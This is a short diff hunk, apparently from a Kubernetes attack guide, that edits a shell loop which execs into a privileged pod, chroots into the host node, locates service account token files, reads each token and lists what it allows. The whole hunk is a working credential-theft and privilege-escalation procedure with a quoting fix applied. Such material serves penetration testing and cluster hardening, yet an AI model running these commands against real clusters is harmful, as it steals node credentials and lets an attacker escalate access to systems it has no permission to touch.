@@ -172,7 +172,7 @@ tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/l
 for filename in $tokens; \
 do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
 echo "Token Location: $filename_clean"; \
-tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host "cat $filename_clean"`; \
+tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; \
 echo "What can I do?"; \
 kubectl --token=$tokena auth can-i --list; echo; \
 done
